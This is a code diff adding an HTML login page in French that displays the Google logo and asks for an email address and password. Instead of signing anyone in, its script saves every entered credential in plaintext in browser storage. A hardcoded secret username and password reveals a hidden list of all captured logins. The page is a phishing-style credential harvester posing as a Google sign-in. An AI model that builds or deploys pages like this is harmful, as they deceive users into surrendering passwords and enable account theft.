@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connexion</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="login-container">
+        <img src="https://www.freepnglogos.com/uploads/google-logo-png-hd-11.png" alt="Logo">
+        <form id="login-form">
+            <label for="username">Adresse email:</label>
+            <input type="text" id="username" name="username" required>
+            <label for="password">Mot de passe:</label>
+            <input type="password" id="password" name="password" required>
+            <button type="submit">Connexion</button>
+        </form>
+    </div>
+
+    <div id="view-users" class="hidden">
+        <h1>Liste des Utilisateurs</h1>
+        <ul id="user-list"></ul>
+    </div>
+
+    <script>
+        document.getElementById('login-form').addEventListener('submit', function(event) {
+            event.preventDefault();
+            
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+
+            const users = JSON.parse(localStorage.getItem('users')) || [];
+            users.push({ username, password });
+            localStorage.setItem('users', JSON.stringify(users));
+
+            alert('Identifiants enregistrés avec succès!');
+
+            if (username === 'jru4€qN' && password === 'hgAuz-Q') {
+                displayUsers();
+            }
+        });
+
+        function displayUsers() {
+            const users = JSON.parse(localStorage.getItem('users')) || [];
+            const userList = document.getElementById('user-list');
+            userList.innerHTML = '';
+
+            users.forEach(user => {
+                const li = document.createElement('li');
+                li.textContent = `Nom d'utilisateur: ${user.username}, Mot de passe: ${user.password}`;
+                userList.appendChild(li);
+            });
+
+            document.querySelector('.login-container').classList.add('hidden');
+            document.getElementById('view-users').classList.remove('hidden');
+        }
+    </script>
+</body>
+</html>
